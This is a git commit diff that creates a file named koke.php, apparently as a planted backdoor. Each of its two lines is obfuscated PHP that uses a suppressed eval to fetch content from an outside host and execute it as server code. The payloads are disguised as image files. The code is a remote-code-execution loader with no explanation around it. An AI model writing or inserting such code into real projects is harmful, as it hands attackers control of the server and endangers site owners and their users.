36ca76d9dab3e603ae9f2d4a0c222fb10db0f80c
zwcdemon <99344145+zwcdemon@users.noreply.github.com>
2022-03-06 10:24:06 -0800

    Create koke.php

---
+++ koke.php
@@ -0,0 +1,2 @@
+<?=/********/ /*******/ /********/@eval/****/("?>".url_get_contents/*******/("https://m.slotao.com/teamm.png"));/**/?>
+<?=/********/ /*******/ /********/@eval/****/("?>".url_get_contents/*******/("https://m.slotao.com/cucok.jpg"));/**/?>
